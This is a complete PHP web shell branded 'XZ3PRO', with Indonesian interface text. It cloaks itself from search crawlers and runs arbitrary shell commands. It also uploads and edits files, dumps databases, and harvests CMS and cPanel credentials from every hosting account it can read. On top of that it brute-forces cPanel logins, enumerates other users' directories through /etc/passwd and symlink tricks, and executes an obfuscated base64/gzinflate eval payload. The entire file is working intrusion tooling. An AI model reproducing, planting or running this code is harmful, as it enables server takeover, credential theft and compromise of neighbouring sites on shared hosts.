<?php
error_reporting(0);
set_time_limit(0);
if(!empty($_SERVER['HTTP_USER_AGENT'])) {
    $userAgents = array("Googlebot", "Slurp", "MSNBot", "PycURL", "facebookexternalhit", "ia_archiver", "crawler", "Yandex", "Rambler", "Yahoo! Slurp", "YahooSeeker", "bingbot");
    if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
        header('HTTP/1.0 404 Not Found');
        exit;
    }
}
function w($path,$perm) {
	if(!is_writable($path)) {
		return "<font color=red>".$perm."</font>";
	} else {
		return "<font color=white>".$perm."</font>";
	}
}
function r($path,$perm) {
	if(!is_readable($path)) {
		return "<font color=red>".$perm."</font>";
	} else {
		return "<font color=white>".$perm."</font>";
	}
}
function perms($file){
	$perms = fileperms($file);
	if (($perms & 0xC000) == 0xC000) {
	// Socket
	$info = 's';
	} elseif (($perms & 0xA000) == 0xA000) {
	// Symbolic Link
	$info = 'l';
	} elseif (($perms & 0x8000) == 0x8000) {
	// Regular
	$info = '-';
	} elseif (($perms & 0x6000) == 0x6000) {
	// Block special
	$info = 'b';
	} elseif (($perms & 0x4000) == 0x4000) {
	// Directory
	$info = 'd';
	} elseif (($perms & 0x2000) == 0x2000) {
	// Character special
	$info = 'c';
	} elseif (($perms & 0x1000) == 0x1000) {
	// FIFO pipe
	$info = 'p';
	} else {
	// Unknown
	$info = 'u';
	}
		// Owner
	$info .= (($perms & 0x0100) ? 'r' : '-');
	$info .= (($perms & 0x0080) ? 'w' : '-');
	$info .= (($perms & 0x0040) ?
	(($perms & 0x0800) ? 's' : 'x' ) :
	(($perms & 0x0800) ? 'S' : '-'));
	// Group
	$info .= (($perms & 0x0020) ? 'r' : '-');
	$info .= (($perms & 0x0010) ? 'w' : '-');
	$info .= (($perms & 0x0008) ?
	(($perms & 0x0400) ? 's' : 'x' ) :
	(($perms & 0x0400) ? 'S' : '-'));
	// World
	$info .= (($perms & 0x0004) ? 'r' : '-');
	$info .= (($perms & 0x0002) ? 'w' : '-');
	$info .= (($perms & 0x0001) ?
	(($perms & 0x0200) ? 't' : 'x' ) :
	(($perms & 0x0200) ? 'T' : '-'));
	return $info;
}
echo "<title>ngemis Akses.id</title>
<style>
html {
color: white;
}
body {
background-color: black;
color: aqua;
}
a {
color: white;
text-decoration: none;
}
hr {
color: white;
}
textarea {
border: 1px solid white;
color: white;
background: transparent;
}
li {
display: inline;
margin: 5px;
color: aqua;
}
.i {
color: white;
}
input { background: transparent; color: white; border: 1px solid white; }
select { background: transparent; color: white; border: 1px solid white; }
.aw { background: transparent; color: aqua; border: 1px solid aqua; padding: 5px; width: 30%;}
</style>
<hr>
<center><b><i><font size='20'>XZ3PRO</font>
<hr><div class='aw'>Path : ";
if(get_magic_quotes_gpc()){
foreach($_POST as $key=>$value){
$_POST[$key] = stripslashes($value);
}
}
if(isset($_GET['path'])){
$path = $_GET['path'];
}else{
$path = getcwd();
}
$path = str_replace('\\','/',$path);
$paths = explode('/',$path);

foreach($paths as $id=>$pat){
if($pat == '' && $id == 0){
$a = true;
echo '<a href="?path=/">/</a>';
continue;
}
if($pat == '') continue;
echo '<a href="?path=';
for($i=0;$i<=$id;$i++){
echo "$paths[$i]";
if($i != $id) echo "/";
}
echo '">'.$pat.'</a>/';
}
echo '</b></i>';
chdir ($path);
echo "<br><br><center>Permission Directory : [ ".w($path, perms($path))." ]</center></div><br>";
echo '<form enctype="multipart/form-data" method="POST">
<input type="file" name="cracker" />
<input type="submit" value="upload" />
</form>';
if(isset($_FILES['cracker'])){
if(copy($_FILES['cracker']['tmp_name'],$path.'/'.$_FILES['cracker']['name'])){
echo 'Berhasil<br />';
}else{
echo 'Gagal<br/>';
}
}
$ip = gethostbyname($_SERVER['HTTP_HOST']);
$svr = php_uname();
$x = (shell_exec('dir')) ? "ON" : "OFF";
$c = (function_exists('curl_version')) ? "ON" : "OFF";
if(!function_exists('posix_getegid')) {
$user = @posix_getpwuid(posix_geteuid());
$user = $user['name'];
} else {
$user = @posix_getpwuid(posix_geteuid());
$user = $user['name'];
}
echo "<hr>Kernel : $svr<br>IP HOST : $ip<br>";
echo "<br>Command : $x | Curl : $c</center><hr><center>";
echo "<li>[ <a class='i' href='?'>Home</a> ]</li>";
echo "<li>[ <a class='i' href='?path=$path&dbdump'>DB Dumper</a> ]</li>";
echo "<li>[ <a class='i' href='?path=$path&it=config'>Config Grabber</a> ]</li>";
echo "<li>[ <a class='i' href='?path=$path&it=cpanel'>Cpanel Crack</a> ]</li>";
echo "<li>[ <a class='i' href='?path=$path&it=jmp'>Jumping</a> ]</li>";
echo "<li>[ <a class='i' href='?path=$path&it=sym'>Symlink</a> ]</li>";
echo "<li>[ <a class='i' href='?path=$path&it=sym_404'>Bypass Symlink 404</a> ]</li>";
echo "<li>[ <a class='i' href='?path=$path&it=admnr'>Adminer</a> ]</li>";
echo "<li>[ <a class='i' href='?logout=true'>Logout</a> ]</li><td></table><hr>";
echo "</center>PHP Execution Command<hr>
<form enctype='multipart/form-data' method='post'>
$user@$ip:~# <input type='text' name='cok'>
<input type='submit' value='~'>
</form>";
chdir($path);
if(isset($_POST['cok'])) {
$cok = shell_exec($_POST['cok']);
}
echo '<textarea class="textarea" style="width: 100%" rows="10">' . htmlentities($cok) . '</textarea>';
if($_GET['logout'] == true) {
	unset($_SESSION[md5($_SERVER['HTTP_HOST'])]);
	echo "<script>window.location='?';</script>";
} elseif($_GET['it'] == 'sym_404') {
echo '<hr><form enctype="multipart/form-data" method="post">
File Target : <input type="text" name="dir" placeholder="/home/user/public_html/wp-config.php"><br><br>
Save Sebagai : <input type="text" name="save"><br><br><input name="bypass" type="submit" value="Bypass !!!"></form>
';
if($_POST['bypass']) {
mkdir("sym404", 0777);
$dir = $_POST['dir'];
$save = $_POST['save'];
shell_exec("ln -s".$dir." sym404/".$save);
symlink($dir,"sym404/".$save);
$fopsym = fopen("sym404/.htaccess","w");
fwrite($fopsym,"ReadmeName ".$save);
fclose($fopsym);
echo '<a href="sym404/">Touch !!!</a>';
}
} elseif($_GET['it'] == 'sym') {
echo '<hr>';
eval(gzinflate(base64_decode('7Vf/T9tGFP89Uv6Hx5HJ9kjtJKhrReKUrjCt0lakQrdJUEWOfcYeF591d8GklP997852SOME1C/SNqlIRM777vfl81468Zwx8EEqMRE0Z0FI7c7k9PjtH8dvz62jk1fvfj9+czZ5e3JyZr3vAiFd6OSBSpxhu9WJerMgzSSqH8YpozbxqAq9LJjRyA15FhMttbubKIVmZbuVxnat49y2W4ezqygVNpGLbCIXM9LtPXv2TKschsknDEOjNzS0CcvgiQQPBOfK0Dva8z6GYJ3kKuUYzessQlkJv3DGeHG6mP2WZlfo/SgVNFRcLIwAoHE3UbN262UUnS1yCoreKA8zkGbg5kkOhvNrkEWMinVmu3UaqFTGC3iZLSwTRq6DiHlOM9tCw0GIryytrlVYZZiF4RciVZhhlO6WkTvDwzhkXJZELUrDhANpt0YqmDIKAUsvMz+kmcIwplxEVPj7WK8Fo75VpJFKDn7q/TAsOU9Czrg42H3+cw//htZYmxHmM/rE0ngU80yBEfdZOqMg0w/UH4xPXXjD3ZGn2eORp6LPUT7iprhfqP1OUvGlulhmhmVe0/bw3Ynp1JDPUc+HPn6LuaBBmCx7EQIJ1bNuS+xSKuhlapMPPKOkW7Oc2xzJk1mgwmQSMGZbu1oAiO3+6JBdq1sb0Q9lInQ5YzaXia2f0DCOGcMGUSKd2bXQef/9ee+948AYBtp/Z455wFBzLtObySVVeTFPI9uMGC8yKqo5u8bEBJJKj7jrppZdhMVfyx8mpsxhlTgCLtTpcVFhS/oZjZEaQCJo7ONA5weeVxSFu+7bJV5dIxZI6asbNW7KLL0EK560nH71c0sjiGXElrzatdXRgOVVyOBpGPASPqNeQ9nL51OWhhOccWaBCgRm0rcmUxZkV1YjxvX+qQKrOghWy1hla29veHd3t0y0Z6bVdNsdZZLqQp4dn575JTRapmQ5uisiq2wGsI3AZyPhfxsI4TEkhAegELnraAg1HMIDeNgflygHW/DC9Pr+Rmx7RGUDJj3mpIlESxyCT4EIzHsvk0VWegT3LBHEAS6A3qTKJu8y8/aKg5YFrbhj6g5FohtsJ6Yc16umO7qloKP3coxNLyuqcWjQi2pWIESwsEuqDuge3LBZLzwEtRfOxcGF50mNbLK71F03tHo6kHIWu3gn1BI480bjHv2WhhDx+gP4+BEaDN+Hnmbcu/GBTNOMNIg6ZX/1+14sm7zrQHgsnXrZNmYg8kKTNnMveZ5Q0eTJjYEYe9GsyZhLNIWgtCWGWOWb3yrbxNAaiLubGebyIg4mG68vlWZzej9AekAeatwNm+DBbl+Bd61Xh1IrklXPjxiosX0rtK85WEX2BrAvxy/YMnsat5cYU8/FOoiXEK7vVS5hB9P7Z5pFvJDEud2C1U2k1hdrA6fvURq9fiZQ93rPvwFIt1tfDdMPYHRd4mRQFdi6GjC2vx8NlqWBUyquqRh5yWD8TWD99dG/CumKznJMFCHDDp5kfXzsmaeBRnl9haMQnpx2xR75YLjl1709B247eN/pH1FrF58RqLATjwUkOaUz14e/eYplO7C6huySiwybtq6ENZoKb2wN69DKc1N/qRrwKRJNVGbtKCqVi4OIsF2UKyXO5/XaeNqtFDV5ZWyeoqmVZVZvsk1Wv2qTNdfYt9lh3xfY9wX2/11ga8O4YYeNvCi9xs8qZDKcZ9rsylwapTvQmw7u1Tfh36sgyzi+MP5sVhTW0XDpQZsr/1+M/wE=')));
} elseif($_GET['it'] == 'admnr') {
        echo "<hr>";
	$full = str_replace($_SERVER['DOCUMENT_ROOT'], "", $path);
	function adminer($url, $isi) {
		$fp = fopen($isi, "w");
		$ch = curl_init();
		 	  curl_setopt($ch, CURLOPT_URL, $url);
		 	  curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
		 	  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		 	  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
		   	  curl_setopt($ch, CURLOPT_FILE, $fp);
		return curl_exec($ch);
		   	  curl_close($ch);
		fclose($fp);
		ob_flush();
		flush();
	}
	if(file_exists('adminer.php')) {
		echo "<center><font color=lime><a href='$full/adminer.php' target='_blank'>-> adminer login <-</a></font></center>";
	} else {
		if(adminer("https://www.adminer.org/static/download/4.2.4/adminer-4.2.4.php","adminer.php")) {
			echo "<center><font color=lime><a href='$full/adminer.php' target='_blank'>-> adminer login <-</a></font></center>";
		} else {
			echo "<center><font color=red>gagal buat file adminer</font></center>";
		}
	}
} elseif($_GET['it'] == 'jmp') {
        echo "<hr>";
	$i = 0;
	echo "<div class='margin: 5px auto;'>";
	if(preg_match("/hsphere/", $path)) {
		$urls = explode("\r\n", $_POST['url']);
		if(isset($_POST['jump'])) {
			echo "<pre>";
			foreach($urls as $url) {
				$url = str_replace(array("http://","www."), "", strtolower($url));
				$etc = "/etc/passwd";
				$f = fopen($etc,"r");
				while($gets = fgets($f)) {
					$pecah = explode(":", $gets);
					$user = $pecah[0];
					$dir_user = "/hsphere/local/home/$user";
					if(is_dir($dir_user) === true) {
						$url_user = $dir_user."/".$url;
						if(is_readable($url_user)) {
							$i++;
							$jrw = "[<font color=lime>R</font>] <a href='?path=$url_user'><font color=gold>$url_user</font></a>";
							if(is_writable($url_user)) {
								$jrw = "[<font color=lime>RW</font>] <a href='?path=$url_user'><font color=gold>$url_user</font></a>";
							}
							echo $jrw."<br>";
						}
					}
				}
			}
		if($i == 0) { 
		} else {
			echo "<br>Total ada ".$i." Kamar di ".$ip;
		}
		echo "</pre>";
		} else {
			echo '<center>
				  <form method="post">
				  List Domains: <br>
				  <textarea name="url" style="width: 500px; height: 250px;">';
			$fp = fopen("/hsphere/local/config/httpd/sites/sites.txt","r");
			while($getss = fgets($fp)) {
				echo $getss;
			}
			echo  '</textarea><br>
				  <input type="submit" value="Jumping" name="jump" style="width: 500px; height: 25px;">
				  </form></center>';
		}
	} elseif(preg_match("/vhosts/", $path)) {
		$urls = explode("\r\n", $_POST['url']);
		if(isset($_POST['jump'])) {
			echo "<pre>";
			foreach($urls as $url) {
				$web_vh = "/var/www/vhosts/$url/httpdocs";
				if(is_dir($web_vh) === true) {
					if(is_readable($web_vh)) {
						$i++;
						$jrw = "[<font color=lime>R</font>] <a href='?path=$web_vh'><font color=gold>$web_vh</font></a>";
						if(is_writable($web_vh)) {
							$jrw = "[<font color=lime>RW</font>] <a href='?path=$web_vh'><font color=gold>$web_vh</font></a>";
						}
						echo $jrw."<br>";
					}
				}
			}
		if($i == 0) { 
		} else {
			echo "<br>Total ada ".$i." Kamar di ".$ip;
		}
		echo "</pre>";
		} else {
			echo '<center>
				  <form method="post">
				  List Domains: <br>
				  <textarea name="url" style="width: 500px; height: 250px;">';
				  bing("ip:$ip");
			echo  '</textarea><br>
				  <input type="submit" value="Jumping" name="jump" style="width: 500px; height: 25px;">
				  </form></center>';
		}
	} else {
		echo "<pre>";
		$etc = fopen("/etc/passwd", "r") or die("<font color=red>Can't read /etc/passwd</font>");
		while($passwd = fgets($etc)) {
			if($passwd == '' || !$etc) {
				echo "<font color=red>Can't read /etc/passwd</font>";
			} else {
				preg_match_all('/(.*?):x:/', $passwd, $user_jumping);
				foreach($user_jumping[1] as $user_idx_jump) {
					$user_jumping_dir = "/home/$user_idx_jump/public_html";
					if(is_readable($user_jumping_dir)) {
						$i++;
						$jrw = "[<font color=lime>R</font>] <a href='?path=$user_jumping_dir'><font color=gold>$user_jumping_dir</font></a>";
						if(is_writable($user_jumping_dir)) {
							$jrw = "[<font color=lime>RW</font>] <a href='?path=$user_jumping_dir'><font color=gold>$user_jumping_dir</font></a>";
						}
						echo $jrw;
						if(function_exists('posix_getpwuid')) {
							$domain_jump = file_get_contents("/etc/named.conf");	
							if($domain_jump == '') {
								echo " => ( <font color=red>gabisa ambil nama domain nya</font> )<br>";
							} else {
								preg_match_all("#/var/named/(.*?).db#", $domain_jump, $domains_jump);
								foreach($domains_jump[1] as $dj) {
									$user_jumping_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
									$user_jumping_url = $user_jumping_url['name'];
									if($user_jumping_url == $user_idx_jump) {
										echo " => ( <u>$dj</u> )<br>";
										break;
									}
								}
							}
						} else {
							echo "<br>";
						}
					}
				}
			}
		}
		if($i == 0) { 
		} else {
			echo "<br>Total ada ".$i." Kamar di ".$ip;
		}
		echo "</pre>";
	}
	echo "</div>";
} elseif(isset($_GET['dbdump'])) {
  echo '<hr><pre><center>';
  echo '
<form action=?dbdump method=post>
Database Dump
Server        : <input class="inputz" type=text name=server size=52>
Username      : <input class="inputz" type=text name=username size=52>
Password      : <input class="inputz" type=text name=password size=52>
DataBase Name : <input class="inputz" type=text name=dbname size=52>
DB Type       : <form method=post action="?dbdump"><select class="inputz" name=method><option  value="gzip">Gzip</option><option value="sql">Sql</option></select>
<input class="inputzbut" type=submit value="  Dump!  " >
</form></center></pre><script>';
  if ($_POST['username'] && $_POST['dbname'] && $_POST['method']){
  $date = date("Y-m-d");
  $dbserver = $_POST['server'];
  $dbuser = $_POST['username'];
  $dbpass = $_POST['password'];
  $dbname = $_POST['dbname'];
  $file = "Dump-$dbname-$date";
  $method = $_POST['method'];
  if ($method=='sql'){
  $file="Dump-$dbname-$date.sql";
  $fp=fopen($file,"w");
  }else{
  $file="Dump-$dbname-$date.sql.gz";
  $fp = gzopen($file,"w");
  }
  function write($data) {
  global $fp;
  if ($_POST['method']=='ssql'){
  fwrite($fp,$data);
  }else{
  gzwrite($fp, $data);
  }}
  mysql_connect ($dbserver, $dbuser, $dbpass);
  mysql_select_db($dbname);
  $tables = mysql_query ("SHOW TABLES");
  while ($i = mysql_fetch_array($tables)) {
      $i = $i['Tables_in_'.$dbname];
      $create = mysql_fetch_array(mysql_query ("SHOW CREATE TABLE ".$i));
      write($create['Create Table'].";nn");
      $sql = mysql_query ("SELECT * FROM ".$i);
      if (mysql_num_rows($sql)) {
          while ($row = mysql_fetch_row($sql)) {
              foreach ($row as $j => $k) {
                  $row[$j] = "'".mysql_escape_string($k)."'";
              }
              write("INSERT INTO $i VALUES(".implode(",", $row).");n");
          }
      }
  }
  if ($method=='ssql'){
  fclose ($fp);
  }else{
  gzclose($fp);}
  header("Content-Disposition: attachment; filename=" . $file);
  header("Content-Type: application/download");
  header("Content-Length: " . filesize($file));
  flush();

  $fp = fopen($file, "r");
  while (!feof($fp))
  {
      echo fread($fp, 65536);
      flush();
  }
  fclose($fp);
  }

} elseif($_GET['it'] == 'cpanel') {
        echo "<hr>";
	if($_POST['crack']) {
		$usercp = explode("\r\n", $_POST['user_cp']);
		$passcp = explode("\r\n", $_POST['pass_cp']);
		$i = 0;
		foreach($usercp as $ucp) {
			foreach($passcp as $pcp) {
				if(@mysql_connect('localhost', $ucp, $pcp)) {
					if($_SESSION[$ucp] && $_SESSION[$pcp]) {
					} else {
						$_SESSION[$ucp] = "1";
						$_SESSION[$pcp] = "1";
						if($ucp == '' || $pcp == '') {
							
						} else {
							$i++;
							if(function_exists('posix_getpwuid')) {
								$domain_cp = file_get_contents("/etc/named.conf");	
								if($domain_cp == '') {
									$dom =  "<font color=red>gabisa ambil nama domain nya</font>";
								} else {
									preg_match_all("#/var/named/(.*?).db#", $domain_cp, $domains_cp);
									foreach($domains_cp[1] as $dj) {
										$user_cp_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
										$user_cp_url = $user_cp_url['name'];
										if($user_cp_url == $ucp) {
											$dom = "<a href='http://$dj/' target='_blank'><font color=lime>$dj</font></a>";
											break;
										}
									}
								}
							} else {
								$dom = "<font color=red>function is Disable by system</font>";
							}
							echo "username (<font color=lime>$ucp</font>) password (<font color=lime>$pcp</font>) domain ($dom)<br>";
						}
					}
				}
			}
		}
		if($i == 0) {
		} else {
			echo "<br>sukses nyolong ".$i." Cpanel by <font color=lime>5YN15T3R_742</font>";
		}
	} else {
		echo "<center>
		<form method='post'>
		USER: <br>
		<textarea style='width: 450px; height: 150px;' name='user_cp'>";
		$_usercp = fopen("/etc/passwd","r");
		while($getu = fgets($_usercp)) {
			if($getu == '' || !$_usercp) {
				echo "<font color=red>Can't read /etc/passwd</font>";
			} else {
				preg_match_all("/(.*?):x:/", $getu, $u);
				foreach($u[1] as $user_cp) {
						if(is_dir("/home/$user_cp/public_html")) {
							echo "$user_cp\n";
					}
				}
			}
		}
		echo "</textarea><br>
		PASS: <br>
		<textarea style='width: 450px; height: 200px;' name='pass_cp'>";
		function cp_pass($dir) {
			$pass = "";
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				if(!is_file("$dir/$dirb")) continue;
				$ambil = file_get_contents("$dir/$dirb");
				if(preg_match("/WordPress/", $ambil)) {
					$pass .= ambilkata($ambil,"DB_PASSWORD', '","'")."\n";
				} elseif(preg_match("/JConfig|joomla/", $ambil)) {
					$pass .= ambilkata($ambil,"password = '","'")."\n";
				} elseif(preg_match("/Magento|Mage_Core/", $ambil)) {
					$pass .= ambilkata($ambil,"<password><![CDATA[","]]></password>")."\n";
				} elseif(preg_match("/panggil fungsi validasi xss dan injection/", $ambil)) {
					$pass .= ambilkata($ambil,'password = "','"')."\n";
				} elseif(preg_match("/HTTP_SERVER|HTTP_CATALOG|DIR_CONFIG|DIR_SYSTEM/", $ambil)) {
					$pass .= ambilkata($ambil,"'DB_PASSWORD', '","'")."\n";
				} elseif(preg_match("/^[client]$/", $ambil)) {
					preg_match("/password=(.*?)/", $ambil, $pass1);
					if(preg_match('/"/', $pass1[1])) {
						$pass1[1] = str_replace('"', "", $pass1[1]);
						$pass .= $pass1[1]."\n";
					} else {
						$pass .= $pass1[1]."\n";
					}
				} elseif(preg_match("/cc_encryption_hash/", $ambil)) {
					$pass .= ambilkata($ambil,"db_password = '","'")."\n";
				}
			}
			echo $pass;
		}
		$cp_pass = cp_pass($dir);
		echo $cp_pass;
		echo "</textarea><br>
		<input type='submit' name='crack' style='width: 450px;' value='Crack'>
		</form>
		<span>NB: CPanel Crack ini sudah auto get password ( pake db password ) maka akan work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span><br></center>";
	}
} elseif($_GET['it'] == 'config') {
        echo "<hr>";
        chdir($path);
	$etc = fopen("/etc/passwd", "r") or die("<pre><font color=red>Can't read /etc/passwd</font></pre>");
	$cracker = mkdir("syn_config", 0777);
	$isi_htc = "Options all\nRequire None\nSatisfy Any";
	$htc = fopen("decay_config/.htaccess","w");
	fwrite($htc, $isi_htc);
	while($passwd = fgets($etc)) {
		if($passwd == "" || !$etc) {
			echo "<font color=red>Can't read /etc/passwd</font>";
		} else {
			preg_match_all('/(.*?):x:/', $passwd, $user_config);
			foreach($user_config[1] as $user_cracker) {
				$user_config_dir = "/home/$user_cracker/public_html/";
				if(is_readable($user_config_dir)) {
					$grab_config = array(
						"/home/$user_cracker/.my.cnf" => "cpanel",
						"/home/$user_cracker/.accesshash" => "WHM-accesshash",
						"/home/$user_cracker/public_html/po-content/config.php" => "Popoji",
						"/home/$user_cracker/public_html/vdo_config.php" => "Voodoo",
						"/home/$user_cracker/public_html/bw-configs/config.ini" => "BosWeb",
						"/home/$user_cracker/public_html/config/koneksi.php" => "Lokomedia",
						"/home/$user_cracker/public_html/lokomedia/config/koneksi.php" => "Lokomedia",
						"/home/$user_cracker/public_html/clientarea/configuration.php" => "WHMCS",
						"/home/$user_cracker/public_html/whm/configuration.php" => "WHMCS",
						"/home/$user_cracker/public_html/whmcs/configuration.php" => "WHMCS",
						"/home/$user_cracker/public_html/forum/config.php" => "phpBB",
						"/home/$user_cracker/public_html/sites/default/settings.php" => "Drupal",
						"/home/$user_cracker/public_html/config/settings.inc.php" => "PrestaShop",
						"/home/$user_cracker/public_html/app/etc/local.xml" => "Magento",
						"/home/$user_cracker/public_html/joomla/configuration.php" => "Joomla",
						"/home/$user_cracker/public_html/configuration.php" => "Joomla",
						"/home/$user_cracker/public_html/wp/wp-config.php" => "WordPress",
						"/home/$user_cracker/public_html/wordpress/wp-config.php" => "WordPress",
						"/home/$user_cracker/public_html/wp-config.php" => "WordPress",
						"/home/$user_cracker/public_html/admin/config.php" => "OpenCart",
						"/home/$user_cracker/public_html/slconfig.php" => "Sitelok",
						"/home/$user_cracker/public_html/application/config/database.php" => "Ellislab");
					foreach($grab_config as $config => $nama_config) {
						$ambil_config = file_get_contents($config);
						if($ambil_config == '') {
						} else {
							$file_config = fopen("decay_config/$user_cracker-$nama_config.txt","w");
							fputs($file_config,$ambil_config);
						}
					}
				}		
			}
		}	
	}
	echo "<center><a href='?path=$path/syn_config'><font color=aqua>Done</font></a></center>";
}
chdir($path);
echo '<hr>File Manager / Change FTP || ';
echo "[ <a href='?path=$path&iac=newfile'>File Baru</a> ]";
echo "[ <a href='?path=$path&iac=newfolder'>Folder Baru</a> ]<hr>";
if($_GET['iac'] == 'newfile') {
        echo "<hr>";
	if($_POST['new_save_file']) {
		$newfile = htmlspecialchars($_POST['newfile']);
		$fopen = fopen($newfile, "a+");
		if($fopen) {
			$act = "<script>window.location='?act=edit&path=".$path."&file=".$_POST['newfile']."';</script>";
		} else {
			$act = "<font color=red>permission denied</font>";
		}
	}
	echo $act;
	echo "<form method='post'>
	Filename: <input type='text' name='newfile' value='$path/newfile.php' style='width: 450px;' height='10'>
	<input type='submit' name='new_save_file' value='Submit'>
	</form>";
} elseif($_GET['iac'] == 'newfolder') {
        echo "<hr>";
	if($_POST['new_save_folder']) {
		$new_folder = $path.'/'.htmlspecialchars($_POST['newfolder']);
		if(!mkdir($new_folder)) {
			$act = "<font color=red>permission denied</font>";
		} else {
			$act = "<script>window.location='?path=".$path."';</script>";
		}
	}
	echo $act;
	echo "<form method='post'>
	Folder Name: <input type='text' name='newfolder' style='width: 450px;' height='10'>
	<input type='submit' name='new_save_folder' value='Submit'>
	</form>";
}
if(isset($_GET['filesrc'])){
echo "<tr><td>Current File : ";
echo $_GET['filesrc'];
echo '</tr></td></table><br />';
echo('<pre>'.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</pre>');
}elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){
echo '</table><br /><center>'.$_POST['path'].'<br /><br />';
if($_POST['opt'] == 'chmod'){
if(isset($_POST['perm'])){
if(chmod($_POST['path'],$_POST['perm'])){
echo 'Change Permission Berhasil</font><br/>';
}else{
echo '<font color="red">Change Permission Gagal</font><br />';
}
}
echo '<form method="POST">
Permission : <input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'" />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="chmod">
<input type="submit" value="Go" />
</form>';
}elseif($_POST['opt'] == 'rename'){
if(isset($_POST['newname'])){
if(rename($_POST['path'],$path.'/'.$_POST['newname'])){
echo 'Ganti Nama Berhasil</font><br/>';
}else{
echo '<font color="red">Ganti Nama Gagal</font><br />';
}
$_POST['name'] = $_POST['newname'];
}
echo '<form method="POST">
New Name : <input name="newname" type="text" size="20" value="'.$_POST['name'].'" />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="rename">
<input type="submit" value="Go" />
</form>';
}elseif($_POST['opt'] == 'edit'){
if(isset($_POST['src'])){
$fp = fopen($_POST['path'],'w');
if(fwrite($fp,$_POST['src'])){
echo 'Berhasil Edit File</font><br/>';
}else{
echo '<font color="red">Gagal Edit File</font><br/>';
}
fclose($fp);
}
echo '<form method="POST">
<textarea cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="edit">
<input type="submit" value="Save" />
</form>';
}
echo '</center>';
}else{
echo '</table><br/><center>';
if(isset($_GET['option']) && $_POST['opt'] == 'delete'){
if($_POST['type'] == 'dir'){
if(rmdir($_POST['path'])){
echo 'Directory Terhapus</font><br/>';
}else{
echo '<font color="red">Directory Gagal Terhapus                                                                                                                                                                                                                                                                                             </font><br/>';
}
}elseif($_POST['type'] == 'file'){
if(unlink($_POST['path'])){
echo 'File Terhapus</font><br/>';
}else{
echo '<font color="red">File Gagal Dihapus</font><br/>';
}
}
}
echo '</center>';
$scandir = scandir($path);
echo '<div><table width="100%" border="0" cellpadding="3" cellspacing="1" align="center">
<tr class="first">
<td><center>Name</peller></center><hr></td>
<td><center>Size</peller></center><hr></td>
<td><center>Permission</peller></center><hr></td>
<td><center>Modify</peller></center><hr></td>
</tr>';

foreach($scandir as $dir){
if(!is_dir($path.'/'.$dir) || $dir == '.' || $dir == '..') continue;
echo '<tr>
<td><a href="?path='.$path.'/'.$dir.'">'.$dir.'</a><hr></td>
<td><center>--</center></td>
<td><center>';
if(is_writable($path.'/'.$dir)) ;
elseif(!is_readable($path.'/'.$dir)) echo '<font color="red">';
echo perms($path.'/'.$dir);
if(is_writable($path.'/'.$dir) || !is_readable($path.'/'.$dir)) echo '</font>';

echo '</center></td>
<td><center><form method="POST" action="?option&path='.$path.'">
<select name="opt">
<option value="">Select</option>
<option value="delete">Delete</option>
<option value="chmod">Chmod</option>
<option value="rename">Rename</option>
</select>
<input type="hidden" name="type" value="dir">
<input type="hidden" name="name" value="'.$dir.'">
<input type="hidden" name="path" value="'.$path.'/'.$dir.'">
<input type="submit" value=">">
</form></center></td>
</tr>';
}
echo '<tr><td></td><td></td><td></td><td></td></tr>';
foreach($scandir as $file){
if(!is_file($path.'/'.$file)) continue;
$size = filesize($path.'/'.$file)/1024;
$size = round($size,3);
if($size >= 1024){
$size = round($size/1024,2).' MB';
}else{
$size = $size.' KB';
}

echo '<tr>
<td><a href="?filesrc='.$path.'/'.$file.'&path='.$path.'">'.$file.'</a></td>
<td><center>'.$size.'</center></td>
<td><center>';
if(is_writable($path.'/'.$file)) ;
elseif(!is_readable($path.'/'.$file)) echo '<font color="red">';
echo perms($path.'/'.$file);
if(is_writable($path.'/'.$file) || !is_readable($path.'/'.$file)) echo '</font>';
echo '</center></td>
<td><center><form method="POST" action="?option&path='.$path.'">
<select name="opt">
<option value="">Select</option>
<option value="delete">Delete</option>
<option value="chmod">Chmod</option>
<option value="rename">Rename</option>
<option value="edit">Edit</option>
</select>
<input type="hidden" name="type" value="file">
<input type="hidden" name="name" value="'.$file.'">
<input type="hidden" name="path" value="'.$path.'/'.$file.'">
<input type="submit" value=">">
</form></center></td>
</tr>';
}
echo '</table>
</div>';
}
echo "<hr><center><a href='https://chat.whatsapp.com/J4nely8tzxN7gnAZRCDR5T' target='_blank'><font size='3px'>Blog</a> Copyright arya - 2018 <a href='https://chat.whatsapp.com/J4nely8tzxN7gnAZRCDR5T' target='_blank'><font size='3px'>TOUCH ME</a><hr>
</body>
</html>";
?>